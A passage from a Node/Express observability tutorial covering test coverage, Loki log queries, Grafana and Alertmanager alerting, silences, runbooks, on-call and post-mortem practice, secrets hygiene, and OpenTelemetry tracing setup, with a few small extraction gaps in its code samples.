// Strategy 2: Unique DB per test file (Testcontainers — recommended)
// Each test file creates and migrates its own database.
// Tests within a file still need afterEach cleanup:
afterEach(async () => {
  await prisma.orderItem.deleteMany({})
  await prisma.order.deleteMany({})
  // Delete in dependency order — FK constraints prevent doing it backwards
})

Coverage

Coverage measures which lines of code were executed during tests. It's a useful tool for finding untested areas, but it's a poor measure of test quality. 100% coverage with shallow assertions can coexist with a deeply buggy codebase. Treat coverage as a floor, not a goal.

Vitest coverage configuration

// vitest.config.ts
coverage: {
  provider:  'v8',           // uses Node's built-in V8 coverage — fast, no babel needed
  reporter:  ['text', 'json', 'html'],
  include:   ['src/**/*.ts'],
  exclude:   [
    'src/**/*.test.ts',
    'src/instrumentation.ts',  // OTel bootstrap — not meaningful to cover
    'src/types/**',            // type declarations only
    'src/migrations/**',
  ],
  thresholds: {
    statements: 80,
    branches:   75,            // branch coverage is the most meaningful metric
    functions:  80,
    lines:      80,
  },
}

Branch coverage — the metric that matters most

Statement coverage tells you that a line ran. Branch coverage tells you that both the if and the else of every conditional ran. A service with 100% statement coverage but 60% branch coverage has untested error paths — which is exactly where bugs hide.

# Run and open the HTML report
npm run test:coverage
open coverage/index.html  # visual per-file breakdown

# Check coverage in CI — fails if thresholds not met
vitest run --coverage

What coverage won't tell you

A test that calls a function but makes no assertions about the result contributes to coverage without providing any safety. Coverage measures execution, not correctness. A function can be "covered" while returning the wrong value — and coverage will never catch that. The assertions are what matter.

Coverage theatre

Writing tests that call every function but only assert expect(result).toBeDefined() to hit a coverage threshold. This satisfies the metric while providing almost no actual protection.

Log monitoring overview

Producing well-structured logs is only half the picture. Monitoring is the practice of actively consuming those logs to understand system health, detect problems early, and reduce the time between something going wrong and someone knowing about it.

The distinction between reactive and proactive monitoring is worth internalizing. Reactive monitoring means your logs are available when something breaks and someone goes looking. Proactive monitoring means the system surfaces problems to you before users report them — or ideally before users are affected at all.

The three layers of log consumption

Real-time dashboards
Panels showing current state — error rates, slow requests, active users, recent security events. Reviewed during deployments and incidents.
Automated alerts
Rules that fire when log patterns cross thresholds. Wake someone up or send a notification without a human watching.
Ad-hoc investigation
Exploratory queries during incidents. The ability to ask arbitrary questions of your log data — "show me everything this user did in the last 30 minutes."
Scheduled review
Regular (daily/weekly) human review of trends, anomalies, and patterns that don't trigger alerts but indicate creeping degradation.

Investigation workflow

A structured investigation workflow means anyone on call can navigate from an alert to a root cause without tribal knowledge. The steps are the same regardless of the incident — what changes is the data.

Step by step

# Step 1 — Scope: how bad is it?
# Open your RED dashboard. Check error rate, request rate, p99 latency.
# Is it all requests or a subset? All routes or one?

# Step 2 — Timeline: when did it start?
# In Grafana → Explore → Loki, set time range to last 2 hours
{service="my-api"} | json | level="error"
# Use the log volume graph to find the spike onset

# Step 3 — First affected request: find a trace ID to anchor on
{service="my-api"} | json | level="error" | event="order.create.failed"
# Click a log line — copy the traceId field

# Step 4 — Jump to trace
# In Grafana → Explore → Jaeger, paste the trace ID
# Identify the slow/failing span — click it for DB query or HTTP details

# Step 5 — Surrounding context
# Back in Loki — filter by that traceId to see all logs for that request
{service="my-api"} | json | traceId="a3f9b2c1..."
# Reconstruct the full sequence of events

# Step 6 — Pattern: is it one user, one product, one region?
{service="my-api"} | json | level="error" | event="order.create.failed"
  | line_format "{{.userId}} {{.productId}}"
# Count by field to find concentration
The most important habit: always anchor on a traceId as quickly as possible. Filtering by time range gives you hundreds of log lines to read. Filtering by trace ID gives you 5–20 lines that represent exactly one failing request. Jump to trace ID first, then widen if the trace doesn't explain it.

Dashboard design

A good dashboard tells a story at a glance. The goal is for someone who just woke up at 3am to understand system health within 10 seconds of opening it. That requires discipline — dashboards that try to show everything show nothing.

The three-tier dashboard structure

Tier 1 — Service health
One dashboard per service. Shows RED metrics and error rate at the top. First stop in every incident. Everything is visible without scrolling.
Tier 2 — Feature drill-down
One dashboard per major feature area (orders, payments, auth). Shows per-route breakdown, business KPIs, feature-specific error patterns.
Tier 3 — Investigation
Ad-hoc Explore queries, not saved dashboards. Freeform LogQL for incident investigation. No one maintains these — they're ephemeral.

Dashboard design principles

Top row is always the health summary

Error rate, request rate, p99 latency — in that order. If these three are green, scroll no further during a normal check.

Use consistent time ranges

Default all panels to the same relative time window (last 1h or last 6h). A dashboard where half the panels show 1h and half show 24h causes misreads during incidents.

Colour consistently — red means bad, green means good

Error rate graphs in red, success rate in green. Never invert this. Dashboard readers make instant colour-based decisions.

Don't add a panel unless you'd act on it

Vanity metrics and rarely-checked stats make dashboards harder to read. Every panel should answer a question someone regularly asks.

Don't put tables of raw logs in dashboards

Log tables belong in Explore, not dashboards. A panel showing 50 raw log lines adds no at-a-glance value and slows dashboard load.

Essential dashboard panels

LogQL query reference

LogQL is Loki's query language. It follows the same model as PromQL — stream selectors narrow the log source, then pipe stages filter and transform the results. Knowing the common patterns makes investigation fast.

Stream selectors — narrow to your service

# Always start with a label selector
{service="my-api"}                          # all logs from this service
{service="my-api", env="production"}        # production only
{service="my-api"} | json                  # parse JSON fields for filtering

Filtering — find what you care about

# By log level
{service="my-api"} | json | level="error"

# By event name
{service="my-api"} | json | event="order.placed"

# By user
{service="my-api"} | json | userId="user-abc123"

# By trace ID — the most powerful investigation filter
{service="my-api"} | json | traceId="a3f9b2c1d4e5f678..."

# Multiple conditions
{service="my-api"} | json | level="error" | event="payment.failed" | ms > 5000

# Text search (use sparingly — slower than label filters)
{service="my-api"} |= "insufficient stock"

Aggregation — derive metrics from logs

# Count events over time
count_over_time({service="my-api"} | json | level="error" [5m])

# Rate of events
rate({service="my-api"} | json | event="order.placed" [5m])

# Group by a field — which events are failing?
sum by (event) (
  rate({service="my-api"} | json | level="error" [10m])
)

# Group by user — who is triggering the most errors?
sum by (userId) (
  count_over_time({service="my-api"} | json | level="error" [1h])
) | topk(10)

Metric extraction — turn log fields into queryable values

# Extract numeric field and compute percentiles
# (requires Loki metric aggregation enabled)
quantile_over_time(0.99,
  {service="my-api"} | json | unwrap ms [5m]
) by (path)

# Average response time per route
avg_over_time(
  {service="my-api"} | json | unwrap ms [5m]
) by (path)

Useful investigation patterns

# Everything that happened in one request
{service="my-api"} | json | requestId="req-abc123"

# All requests from one IP in last hour
{service="my-api"} | json | ip="1.2.3.4"

# Failed requests grouped by route
sum by (path) (
  count_over_time({service="my-api"} | json | status >= 500 [1h])
)

# Slow requests with context
{service="my-api"} | json | ms > 2000
  | line_format "{{.method}} {{.path}} took {{.ms}}ms — trace: {{.traceId}}"

Alerting model

An alert should represent a condition that requires human attention right now. Every alert that fires should either result in an action or teach you that the threshold was wrong. Alerts that routinely fire and get ignored are worse than no alerts — they train people to ignore alerts.

Alert severity levels

SeverityMeaningResponseChannel
criticalUsers are affected right now. Service may be down.Immediate, any hourPagerDuty / phone
warningDegradation detected. Not yet user-visible or early stage.Within business hoursSlack #alerts
infoNoteworthy event that doesn't require action but should be visible.Review next working daySlack #logs or email

Alert on symptoms, not causes

Alert on symptoms — what users experience

Error rate above 1%. p99 latency above 2 seconds. Login failure rate spiking. These directly represent user-visible degradation.

Don't alert on causes — what the system is doing

CPU above 80%. Memory above 70%. Connection pool above 50 connections. These may or may not affect users — they create noise and train people to ignore alerts.

The exception: alert on causes only when you have strong historical evidence that a particular cause always leads to a user-visible symptom, and the cause fires early enough to allow preventive action.

Alert rules

Grafana-managed alerts are the recommended alert rule type — they can query multiple data sources in a single rule, support expression-based transformations, and handle error and no-data states properly. The following rules cover the most important Node/Express service concerns.

Alert rules as provisioned YAML

# grafana/provisioning/alerting/alert-rules.yaml
apiVersion: 1
groups:
  - orgId: 1
    name: my-api-critical
    folder: Production
    interval: 1m    # evaluate every minute
    rules:

      # High error rate — users getting 5xx responses
      - uid: high-error-rate
        title: High error rate
        condition: C
        for: 5m     # must be true for 5 minutes before firing (reduces flap)
        labels:   { severity: critical, service: my-api }
        annotations:
          summary:  "Error rate {{ $value | humanizePercentage }}"
          runbook:  "https://wiki.example.com/runbooks/high-error-rate"
        data:
          - refId: A    # raw error count from Loki
            datasourceUid: loki-uid
            model:
              expr: sum(rate({service="my-api"} | json | level="error" [5m]))
          - refId: B    # total request count
            datasourceUid: loki-uid
            model:
              expr: sum(rate({service="my-api"} | json | event="http.request" [5m]))
          - refId: C    # math: error rate as a ratio
            datasourceUid: __expr__
            model:
              type: math
              expression: $A / $B
        noDataState:   NoData    # treat missing data as no alert (not firing)
        execErrState:  Error

      # Token reuse — potential account compromise
      - uid: token-reuse-detected
        title: Refresh token reuse detected
        condition: A
        for: 0s     # fire immediately — no delay for security events
        labels:   { severity: critical, service: my-api, type: security }
        annotations:
          summary:  "{{ $value }} token reuse events detected"
          runbook:  "https://wiki.example.com/runbooks/token-reuse"
        data:
          - refId: A
            datasourceUid: loki-uid
            model:
              expr: |
                count_over_time(
                  {service="my-api"} | json | event="auth.token.reuse" [5m]
                )

  - name: my-api-warnings
    interval: 2m
    rules:
      # Brute force — high login failure rate from single IP
      - uid: login-failure-spike
        title: High login failure rate
        condition: A
        for: 2m
        labels:   { severity: warning, type: security }
        annotations:
          summary: "{{ $value }} login failures in 5 minutes"
        data:
          - refId: A
            datasourceUid: loki-uid
            model:
              expr: |
                sum(rate(
                  {service="my-api"} | json | event="auth.login.failure" [5m]
                )) > 0.5    # more than 0.5/s = 30/min

      # Slow requests — p99 above threshold
      - uid: high-latency
        title: High p99 latency
        condition: A
        for: 10m
        labels:   { severity: warning }
        data:
          - refId: A
            datasourceUid: prometheus-uid
            model:
              expr: |
                histogram_quantile(0.99,
                  rate(http_server_duration_bucket{service="my-api"}[5m])
                ) > 2

Alert fatigue

Alert fatigue is the single biggest failure mode in monitoring. When too many alerts fire — especially alerts that don't require action — teams learn to ignore them. The result is that a critical alert gets missed because it looks like every other alert that turned out to be noise. This is more dangerous than having no alerts at all.

Symptoms of alert fatigue

Signs your alerting is broken

Alerts are routinely acknowledged without investigation. The same alert fires multiple times a week without a fix being deployed. On-call engineers mute or silence alerts as a first action rather than a last resort. Alerts fire at the same time because of a single root cause (alert storms).

The evaluation interval and pending period

# These two settings are your first defence against flapping
# and transient spikes causing unnecessary pages:

- uid: high-error-rate
  interval: 1m       # re-evaluate every 1 minute
  for: 5m            # must be true for 5 consecutive minutes before firing

# "for: 5m" means: the condition must be met in 5 consecutive evaluations
# A 30-second spike in errors fires and recovers without ever paging anyone
# A sustained degradation fires after 5 minutes — acceptable delay for non-critical

Alert grouping — prevent alert storms

# alertmanager.yml
# When multiple alerts fire together (e.g. a deployment causes
# high latency AND high error rate AND slow DB queries),
# group them into one notification rather than three pages

route:
  group_by:        ['service', 'env']   # group alerts from same service together
  group_wait:      30s    # wait 30s for more alerts before sending first notification
  group_interval:  5m     # wait 5m before sending new notification for same group
  repeat_interval: 4h     # re-notify every 4h if still firing

Weekly alert review practice

Every alert that fires during the week should be reviewed in a short meeting: did it require action? Was the threshold right? Was the runbook helpful? An alert that fires without requiring action should either have its threshold raised, its pending period extended, or be deleted. Over time this process produces an alert suite where every firing alert means something real.

A useful target: your on-call engineer should be paged no more than 2–3 times per week outside business hours. More than that and you're burning out your team and creating alert fatigue. If you're above that number, do a triage: which alerts can have their threshold raised? Which can be moved to business-hours-only notification?

Routing & escalation

Alertmanager routes alerts to the right team or channel based on labels. The routing tree starts at the root receiver and matches labels in order — first match wins unless continue: true is set.

Full Alertmanager routing config

# alertmanager.yml
global:
  resolve_timeout: 5m

route:
  receiver: slack-default
  group_by:        ['alertname', 'service']
  group_wait:      30s
  group_interval:  5m
  repeat_interval: 4h

  routes:
    # Security alerts — immediate page regardless of time
    - matchers:
        - type = security
      receiver: pagerduty-critical
      group_wait:      0s    # no delay for security events
      repeat_interval: 1h
      continue: true         # also send to Slack for visibility

    # Critical severity — page during incidents
    - matchers:
        - severity = critical
      receiver: pagerduty-critical
      group_wait: 30s

    # Warning severity — Slack only

        channel:  '#alerts-warnings'

Silences & muting

Silences suppress alert notifications for a defined time window without changing the alert rule itself. They're the right tool for planned maintenance windows, known issues being actively worked, and deployments where transient errors are expected.

When to use silences

Good reasons to silence

Scheduled maintenance window (database upgrade, certificate rotation). Active incident being worked — you know about it, no need to keep paging. Known regression being hotfixed — estimated fix time is 30 minutes.

Bad reasons to silence

Alert is too noisy and you can't be bothered to fix the threshold right now. Silencing indefinitely because the alert "usually doesn't mean anything". Silencing because the team is busy — that's when you most need alerts.

Creating a silence via Grafana UI

# Grafana → Alerting → Silences → Add Silence
# Matchers: alertname = HighErrorRate, service = my-api
# Duration: 2h
# Comment: Deployment in progress — expected transient errors

# Or via the Alertmanager API:
curl -X POST http://alertmanager:9093/api/v2/silences \
  -H 'Content-Type: application/json' \
  -d '{
    "matchers": [
      { "name": "alertname", "value": "HighErrorRate", "isRegex": false },
      { "name": "service",   "value": "my-api",        "isRegex": false }
    ],
    "startsAt":  "2025-09-14T14:00:00Z",
    "endsAt":    "2025-09-14T16:00:00Z",
    "createdBy": "deploy-script",
    "comment":   "Deployment window — expected transient errors"
  }'

Recurring maintenance windows — mute timings

# For recurring windows (weekly maintenance, known quiet periods)
# use mute timings in Grafana rather than manually creating silences

# grafana/provisioning/alerting/mute-timings.yaml
apiVersion: 1
muteTimes:
  - orgId: 1
    name: weekly-maintenance
    time_intervals:
      - weekdays: ['sunday']
        times:
          - start_time: '02:00'
            end_time:   '04:00'
Always set an end time on a silence. An open-ended silence means alerts stop firing indefinitely — production incidents can occur silently for days. If a maintenance window runs long, extend the silence explicitly rather than creating one without an end time.

Runbooks

A runbook is a document linked from an alert that tells the responder exactly what to do. Its value is highest at 3am when the person on call is half asleep and may not be familiar with the affected system. A good runbook means the response doesn't depend on tribal knowledge.

Runbook structure

# runbooks/high-error-rate.md

## High error rate — my-api

### What this alert means
Error rate for my-api exceeded 1% for 5 consecutive minutes.
Users are likely seeing failures on some or all requests.

### Immediate triage (first 5 minutes)
1. Open the service health dashboard
   → Check: is it all routes or specific ones?
   → Check: did it start with a deployment? Check deploy history.

2. Find a failing trace
   Loki query: {service="my-api"} | json | level="error" | limit 10
   → Copy a traceId → open in Jaeger

3. Check for downstream failures
   → Is the database reachable? Check DB connection pool metrics.
   → Is an external API timing out? Check outbound HTTP spans.

### Common causes and fixes
| Symptom | Likely cause | Fix |
|---|---|---|
| DB connection errors | Pool exhausted or DB down | Check DB health, restart if needed |
| Validation errors spiking | Bad deploy changed schema | Rollback |
| External API 502/503 | Third-party outage | Check status page, circuit break |
| Memory errors | Memory leak in new deploy | Rollback, increase memory limit |

### Escalation
- If not resolved in 30 minutes: escalate to backend lead
- If database is involved: escalate to DBA

### Links
- [Service health dashboard](https://grafana.example.com/...)
- [Deploy history](https://ci.example.com/...)
- [DB monitoring](https://grafana.example.com/...)

Linking runbooks from alert rules

# In your alert rule YAML:
annotations:
  summary: "Error rate {{ $value | humanizePercentage }}"
  runbook: "https://wiki.example.com/runbooks/high-error-rate"
  # Grafana shows this as a clickable link in the alert notification
Write runbooks before alerts, not after incidents. The best time to document what to do when an alert fires is when you're writing the alert rule and you understand the system. After an incident is the second-best time. Waiting until the next incident is too late.

On-call practices

On-call is a practice that directly affects engineer health and retention. A badly run on-call rotation burns people out. The monitoring system should be designed to make on-call manageable — not to give maximum visibility at the cost of constant interruption.

On-call schedule principles

Follow-the-sun rotation

Route on-call to engineers in the awake timezone. Someone in London covering a US-based service at 3am is not on-call — they're just not sleeping. Follow-the-sun means no one covers hours outside a reasonable working day.

Primary and secondary responders

Two people are on-call simultaneously. The primary gets paged first. If they don't acknowledge within 15 minutes, the secondary is paged. This prevents a single point of failure — illness, connectivity issues, personal emergencies.

On-call handoff notes

At shift change, the outgoing person writes a brief note: what alerts fired, what was done, what's still being watched. The incoming person reads it before taking over. Prevents incidents from falling through the cracks during handoff.

On-call health metrics — track these

# These are signals of on-call health — review monthly
# If any are trending wrong, the alert system needs work

Pages per week outside business hours   → target: < 3
Mean time to acknowledge (MTTA)        → target: < 5 minutes
Mean time to resolve (MTTR)            → review per incident type
Alert actionability rate               → % of alerts that required action
False positive rate                    → % of alerts that resolved without action

Post-incident review cadence

Every incident that causes user impact or pages someone outside business hours should result in a brief post-incident review — not a blame exercise, but a process improvement exercise. The output is action items, not a report.

Post-mortems

A post-mortem is a structured review of what happened during an incident, why it happened, and what will be done differently. The goal is systemic improvement, not blame. A well-run post-mortem makes the next incident less likely and less severe.

Post-mortem template

# incident-2025-09-14-payment-outage.md

## Incident summary
Date:     2025-09-14 14:32 UTC
Duration: 47 minutes
Impact:   Payment endpoint returned 503 for ~12% of requests
Severity: Critical

## Timeline
14:32 — HighErrorRate alert fires (error rate reached 1.2%)
14:33 — On-call engineer acknowledges
14:38 — Trace investigation identifies payment service timeout
14:45 — Identified: rate limit on Stripe API — deployment increased request rate
14:55 — Deployed fix: request batching to stay under rate limit
15:19 — Error rate returned to baseline, alert resolved

## Root cause
A new feature deployed at 14:25 called the Stripe API once per order item
instead of once per order. At peak traffic this exceeded Stripe's rate limit,
causing 429 responses that our code treated as 503 to clients.

## What went well
- Alert fired within 2 minutes of the degradation starting
- Trace investigation identified the cause in 7 minutes
- On-call runbook for payment errors was up to date

## What went wrong
- No rate limit monitoring for outbound Stripe API calls
- Code review did not catch the N×1 API call pattern
- Integration test environment does not simulate Stripe rate limits

## Action items
| Action | Owner | Due |
|---|---|---|
| Add OTel metric for Stripe API call rate | @dev1 | 2025-09-21 |
| Add alert: Stripe calls/min > 80% of limit | @dev1 | 2025-09-21 |
| Add rate limit simulation to integration tests | @dev2 | 2025-09-28 |
| Update code review checklist: check external API call patterns | @dev3 | 2025-09-21 |
Action items from post-mortems should be treated like production bugs — filed, assigned, tracked to completion. A post-mortem with no completed action items is a theatre exercise. The value is in the systemic changes, not the document itself.

Regular log review

Automated alerts catch acute problems — spikes that cross a threshold. Regular manual review catches chronic problems — slowly worsening trends, low-frequency patterns, and things that are wrong but not wrong enough to alert. Both are necessary.

Daily review — 10 minutes

# Run these queries each morning before starting work
# They surface overnight issues and slow-burn problems

# 1. Errors in the last 24 hours — any new error types?
sum by (event) (
  count_over_time({service="my-api"} | json | level="error" [24h])
)

# 2. Security events overnight
{service="my-api"} | json
  | event=~"auth.login.failure|auth.token.reuse|authz.forbidden"
  | line_format "{{.time}} | {{.event}} | {{.ip}} | {{.userId}}"

# 3. Slow requests overnight
{service="my-api"} | json | ms > 5000
  | line_format "{{.path}} — {{.ms}}ms — trace: {{.traceId}}"
| limit 20

Weekly review — 30 minutes

# Trend analysis — are things getting better or worse?

# Error rate week over week
sum(rate({service="my-api"} | json | level="error" [7d]))
  compared to the previous 7 days

# Top error events this week
sum by (event) (
  count_over_time({service="my-api"} | json | level="error" [7d])
) | topk(10)

# Slowest routes this week
quantile_over_time(0.99,
  {service="my-api"} | json | unwrap ms [7d]
) by (path)
| topk(5)

# Review alerts that fired this week:
# - Did each require action?
# - Are any thresholds producing too many false positives?

Monthly review — 1 hour

Once a month, review the alerting system itself rather than just the logs. Which alerts fired most? Which required action? Which were false positives? Which incidents occurred that were not caught by alerts? This feedback loop is how the monitoring system improves over time.

Anomaly detection

Fixed-threshold alerts are brittle — a threshold set for weekday traffic will fire every weekend when traffic is naturally lower, and will miss anomalies on days when traffic is higher than usual. Anomaly detection fires when something is unusual relative to its baseline, regardless of absolute value.

Simple anomaly detection in Grafana

# Grafana supports anomaly detection via the Metrics Insights feature
# (Grafana 10+ with Machine Learning plugin, or Grafana Cloud)

# Simpler approach: compare current period to previous period
# using Grafana's built-in "Compare to previous period" option

# In a Grafana panel using Prometheus:
# Series 1: current error rate
rate(http_server_duration_count{status=~"5.."}[5m])

# Series 2: same query, offset by 1 week
rate(http_server_duration_count{status=~"5.."}[5m] offset 1w)

# Alert if current is > 3x the week-prior baseline:
rate(http_server_duration_count{status=~"5.."}[5m])
  /
rate(http_server_duration_count{status=~"5.."}[5m] offset 1w)
  > 3

Statistical anomaly detection with Loki

# Detect when error rate deviates significantly from rolling average
# Useful for catching gradual increases that never cross a fixed threshold

# Current 5-minute rate
sum(rate({service="my-api"} | json | level="error" [5m]))

# vs. average over the past hour (12 × 5-minute windows)
sum(avg_over_time(
  sum(rate({service="my-api"} | json | level="error" [5m]))[1h:5m]
))

# Alert when current > 3× hourly average
# (uses a Grafana math expression combining both queries)

When anomaly detection helps most

Traffic patterns
Services with strong daily/weekly seasonality where fixed thresholds would fire legitimately low overnight traffic as "suspicious."
Gradual degradation
Memory leaks, connection pool creep, slow query regression — things that degrade over days, never crossing a fixed threshold but trending clearly wrong.
Business metrics
Order rate, signup rate — you want to know when they're unusually low (possible outage) or high (possible fraud), relative to the normal pattern for that time.
Security
Login failure rate that's unusual for that time of day — a brute force attack at 4am looks very different from lunch-hour forgotten passwords.

Secrets management

Hardcoded secrets are the most commonly exploited vulnerability in leaked codebases. A secret in git history is compromised forever — even if you delete the file in a later commit.

Prevent accidental commits

# .gitignore
.env
.env.local
.env.production
*.pem
*.key
secrets/

npm install -D @secretlint/secretlint @secretlint/secretlint-rule-preset-recommend

# .secretlintrc.json
{ "rules": [{ "id": "@secretlint/secretlint-rule-preset-recommend" }] }

npx secretlint "**/*"

Production secrets strategy

AWS Secrets Manager
Fetched at runtime via SDK. Automatic rotation. IAM-controlled access.
HashiCorp Vault
Self-hosted or cloud. Dynamic secrets, fine-grained policies, full audit log.
Doppler
Developer-friendly. Syncs to env vars. Good DX for teams.
k8s External Secrets
Kubernetes External Secrets Operator. Combine with Sealed Secrets for GitOps.
If a secret is accidentally committed: rotate it immediately — assume it is compromised. Use git filter-repo (not filter-branch) to purge history and force-push. Rotation is primary; history purging is secondary.

What is observability

Observability is the ability to understand the internal state of a system by examining its external outputs — without needing to add new instrumentation every time a new question arises. It's distinct from monitoring, which tells you when something is broken. Observability lets you understand why.

The practical difference: monitoring says "error rate is 5%." Observability says "error rate is 5%, all from user accounts created before the migration, all hitting the /orders endpoint, all with a specific product ID in the payload, all originating from mobile clients." You can answer that second question without deploying new code because the data is already there.

Why it matters more as your app grows

A single Express app on one server is debuggable with logs and a process monitor. Once you have multiple services, multiple instances, background workers, and queues, a single failed request may have touched a dozen components. Without distributed traces you are guessing at causality.

Even for a single-service app, observability pays off during incidents. The difference between a 15-minute outage and a 3-hour one is often whether the person on call can answer "which requests are failing and why" in 30 seconds or 30 minutes.

The three pillars

Observability data comes in three forms. Each answers different questions. You need all three — they complement rather than replace each other.

PillarQuestion it answersTool for storageRetention
TracesWhy did this request take 4 seconds?Jaeger, Tempo, HoneycombDays to weeks
MetricsIs p99 latency trending upward?Prometheus, VictoriaMetricsWeeks to months
LogsWhat was the exact error message at 14:32?Loki, Elasticsearch, CloudWatchDays to months

How they work together in practice

An alert fires: p99 latency for POST /orders exceeds 2 seconds. That's a metric alert. You click into the metric and find it started 20 minutes ago. You open the distributed trace for one of the slow requests — the trace shows 1.8 seconds spent inside ordersRepo.createWithItems. You click the span and see it has a db.statement attribute — a full table scan on a missing index. You jump to the logs correlated to that trace ID and see a Prisma warning logged three days ago that you missed. Root cause found in under 5 minutes.

OpenTelemetry overview

OpenTelemetry (OTel) is the CNCF standard for producing, collecting, and exporting telemetry data. It is vendor-neutral — you instrument your app once and can send data to any compatible backend (Jaeger, Datadog, Honeycomb, Grafana, etc.) by changing configuration, not code.

Key concepts

Span
A single unit of work — one DB query, one HTTP call, one function. Has a start time, end time, attributes, and status.
Trace
A collection of spans linked by a trace ID. Represents the full lifecycle of one request, potentially across many services.
Context propagation
The trace ID travels with the request via HTTP headers (traceparent). Downstream services add their spans to the same trace.
Exporter
The component that sends telemetry data to a backend. OTLP (OpenTelemetry Protocol) is the universal format — supported by all major backends.
Resource
Attributes that describe the entity producing telemetry — service name, version, environment. Attached to all spans and metrics from a process.
Sampler
Decides which traces to record. Sampling 100% of traffic in production is expensive — a rate-based or tail-based sampler reduces volume while keeping interesting traces.
OpenTelemetry is now stable for traces and metrics. The logging signal is GA as of late 2024. Use it for all three pillars rather than mixing OTel traces with a separate, unconnected logging library — correlation comes for free when they're from the same SDK.

instrumentation.ts

This file configures the OTel SDK and must be loaded before everything else via --import. It defines three things: your service's identity (resource), where to send data (exporters), and what to instrument (instrumentations).

// src/instrumentation.ts
import { NodeSDK } from '@opentelemetry/sdk-node'
import { Resource } from '@opentelemetry/resources'
import { ATTR_SERVICE_NAME, ATTR_SERVICE_VERSION } from '@opentelemetry/semantic-conventions'
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http'
import { OTLPMetricExporter } from '@opentelemetry/exporter-metrics-otlp-http'
import { PeriodicExportingMetricReader } from '@opentelemetry/sdk-metrics'
import { BatchSpanProcessor, ParentBasedSampler, TraceIdRatioBasedSampler } from '@opentelemetry/sdk-trace-base'
import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node'

const isProd = process.env.NODE_ENV === 'production'

const sdk = new NodeSDK({
  // Service identity — appears in all traces and metrics
  resource: new Resource({
    [ATTR_SERVICE_NAME]:    process.env.SERVICE_NAME    ?? 'my-api',
    [ATTR_SERVICE_VERSION]: process.env.SERVICE_VERSION ?? '0.0.0',
    'deployment.environment': process.env.NODE_ENV ?? 'development',
  }),

  // Trace exporter — sends to OTel Collector or directly to backend
  spanProcessor: new BatchSpanProcessor(
    new OTLPTraceExporter({
      url: process.env.OTEL_EXPORTER_OTLP_TRACES_ENDPOINT
        ?? 'http://localhost:4318/v1/traces',
    }),
    {
      maxQueueSize:        2048,
      maxExportBatchSize:  512,
      scheduledDelayMillis: 5000,
    }
  ),

  // Metrics exporter — pushes on a schedule
  metricReader: new PeriodicExportingMetricReader({
    exporter: new OTLPMetricExporter({
      url: process.env.OTEL_EXPORTER_OTLP_METRICS_ENDPOINT
        ?? 'http://localhost:4318/v1/metrics',
    }),
    exportIntervalMillis: 30_000,  // push every 30s
  }),

  // Sampling — 100% in dev, 10% in prod (adjust per traffic volume)
  sampler: isProd
    ? new ParentBasedSampler({
        root: new TraceIdRatioBasedSampler(
          parseFloat(process.env.OTEL_SAMPLE_RATE ?? '0.1')
        )
      })
    : undefined,  // undefined = sample everything (default)

  // Auto-instrument Express, HTTP, pg, Prisma, Redis, etc.
  instrumentations: [
    getNodeAutoInstrumentations({
      // Disable noisy fs instrumentation
      '@opentelemetry/instrumentation-fs': { enabled: false },
      // Ignore health check spans to reduce noise
      '@opentelemetry/instrumentation-http': {
        ignoreIncomingRequestHook: (req) =>
          req.url === '/health',
      },
    }),
  ],
})

sdk.start()

// Flush telemetry on graceful shutdown
process.on('SIGTERM', () => sdk.shutdown())
process.on('SIGINT',  () => sdk.shutdown())
Call sdk.start() synchronously — not inside an async function. The SDK must wrap modules before they're imported. Any await before start() risks missing instrumentation on modules that load during that delay.

Auto-instrumentation

With getNodeAutoInstrumentations() loaded via --import, you get traces for free across the entire request lifecycle — no code changes to your app required.

What gets instrumented automatically

HTTP layer
Every incoming request becomes a root span. Method, route, status code, response time all captured as attributes.
Express routing
Each middleware and route handler gets a child span. You can see exactly which middleware is slow.
Prisma / pg
Every database query gets a span with the SQL statement, table name, and duration. N+1 queries are immediately visible.
Outbound HTTP
Calls to external APIs (fetch, axios, got) get spans with target URL, method, and status. Propagates trace context downstream.
Redis
Cache hits and misses, command names, and latency — all visible as child spans.
DNS / TCP
Connection establishment time captured — useful for diagnosing cold-start latency and connection pool exhaustion.

Custom spans

Auto-instrumentation covers infrastructure boundaries (HTTP, DB, cache). Custom spans cover what happens inside your application logic — business operations, validation steps, external integrations that aren't auto-instrumented.

Basic custom span

// features/orders/orders.service.ts
import { SpanStatusCode } from '@opentelemetry/api'
import { getTracer } from '../../lib/tracer.js'

export async function createOrder(userId: string, input: CreateOrderInput) {
  const tracer = getTracer()

  return tracer.startActiveSpan('orders.create', async (span) => {
    try {
      // Add attributes — searchable dimensions in your tracing backend
      span.setAttributes({
        'order.user_id':    userId,
        'order.item_count': input.items.length,
        'order.total_value': input.items.reduce(
          (s, i) => s + i.quantity * i.unitPrice, 0
        ),
      })

      // Child spans for sub-operations
      const validationResult = await tracer.startActiveSpan(
        'orders.validate_stock',
        async (childSpan) => {
          try {
            const result = await validateStock(input.items)
            childSpan.setStatus({ code: SpanStatusCode.OK })
            return result
          } catch (err) {
            childSpan.recordException(err as Error)
            childSpan.setStatus({ code: SpanStatusCode.ERROR, message: (err as Error).message })
            throw err
          } finally {
            childSpan.end()
          }
        }
      )

      const order = await createOrderInDB(userId, input)

      // Add outcome attributes after the operation
      span.setAttributes({ 'order.id': order.id, 'order.status': order.status })
      span.setStatus({ code: SpanStatusCode.OK })
      return order
    } catch (err) {
      span.recordException(err as Error)
      span.setStatus({ code: SpanStatusCode.ERROR, message: (err as Error).message })
      throw err
    } finally {
      span.end()  // always end the span — missing end() = missing trace
    }
  })
}
Always call span.end() — put it in a finally block. A span that is never ended is either dropped or held in memory indefinitely depending on the SDK configuration.

Context propagation

Context propagation is what turns a collection of spans into a distributed trace. When your service calls another service, it injects the current trace ID into the outgoing request headers. The downstream service reads those headers and creates its spans as children of the same trace.

How it works automatically

# OTel auto-instrumentation handles W3C Trace Context headers automatically
# Outgoing fetch/http.request calls get:
# traceparent: 00-{traceId}-{spanId}-01

# The downstream service reads this header and links its spans:
# GET /inventory (downstream)
#   └── parent: your POST /orders span ID

Manual context injection — for queues, workers, cron jobs

Auto-instrumentation only covers HTTP. If you publish a job to a queue, the trace context needs to be carried in the job payload so the worker can continue the trace.

import { context, propagation, trace } from '@opentelemetry/api'

// PRODUCER — inject trace context into the job payload
export async function queueOrderNotification(orderId: string) {
  const carrier: Record = {}
  propagation.inject(context.active(), carrier)
  // carrier now contains: { traceparent: '00-...', tracestate: '...' }

  await queue.publish('order.notifications', {
    orderId,
    _otelContext: carrier,   // carry context in the payload
  })
}

// CONSUMER (worker process) — restore context from payload
